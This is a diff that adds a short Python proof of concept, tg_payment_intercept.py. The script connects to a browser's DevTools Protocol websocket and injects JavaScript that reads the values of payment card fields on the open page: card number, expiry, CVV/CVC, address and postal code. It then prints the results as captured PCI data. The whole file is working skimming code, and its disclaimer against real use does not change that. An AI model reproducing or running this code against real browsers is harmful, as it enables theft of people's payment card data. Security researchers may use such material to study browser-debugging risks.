@@ -1,0 +1,68 @@
+"""
+tg_payment_intercept.py -- Payment form data interception
+Demonstrates how CDP allows access to DOM fields containing
+PCI data before they are sent to the payment processor.
+NOTE: Conceptual PoC. Do not use against real forms.
+"""
+import websocket
+import json
+
+def intercept_payment_fields(ws_url):
+    """Read payment form fields via CDP DOM access."""
+    ws = websocket.create_connection(ws_url)
+    
+    # Inject an observer that captures input values
+    js_observer = """
+    (function() {
+        var fields = {};
+        // Search for payment fields by common attributes
+        var selectors = [
+            'input[name*="card"]',
+            'input[name*="number"]',
+            'input[autocomplete="cc-number"]',
+            'input[autocomplete="cc-exp"]',
+            'input[autocomplete="cc-csc"]',
+            'input[name*="cvv"]',
+            'input[name*="cvc"]',
+            'input[name*="expir"]',
+            'input[name*="address"]',
+            'input[name*="postal"]',
+            'input[name*="zip"]'
+        ];
+        
+        selectors.forEach(function(sel) {
+            var els = document.querySelectorAll(sel);
+            els.forEach(function(el) {
+                fields[el.name || el.id || sel] = {
+                    value: el.value,
+                    type: el.type,
+                    autocomplete: el.autocomplete
+                };
+            });
+        });
+        
+        return JSON.stringify(fields);
+    })();
+    """
+    
+    cmd = json.dumps({
+        "id": 1,
+        "method": "Runtime.evaluate",
+        "params": {"expression": js_observer, "returnByValue": True}
+    })
+    ws.send(cmd)
+    result = json.loads(ws.recv())
+    
+    payment_data = json.loads(
+        result["result"]["result"]["value"]
+    )
+    
+    if payment_data:
+        print("[!] PCI DATA CAPTURED:")
+        for field, info in payment_data.items():
+            print(f"    {field}: {info}")
+    else:
+        print("[-] No active payment fields found")
+    
+    ws.close()
+    return payment_data
